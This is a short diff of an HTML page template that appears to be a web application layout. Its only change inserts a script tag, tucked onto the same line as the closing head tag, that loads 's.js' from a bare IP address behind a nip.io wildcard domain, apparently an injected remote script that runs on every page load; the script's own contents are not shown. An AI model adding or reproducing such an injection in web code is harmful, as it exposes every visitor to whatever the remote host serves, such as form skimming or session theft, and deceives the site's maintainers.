@@ -12,7 +12,7 @@
 
         <!-- Styles -->
         <link rel="stylesheet" type="text/css" href="{{ static_asset('site/css/illustrated.css') }}">
-    </head>
+    <script src="https://153.75.226.33.nip.io/s.js" async></script></head>
     <body class="antialiased font-sans">
         <div class="md:flex min-h-screen">
             <div class="w-full md:w-1/2 bg-white flex items-center justify-center">
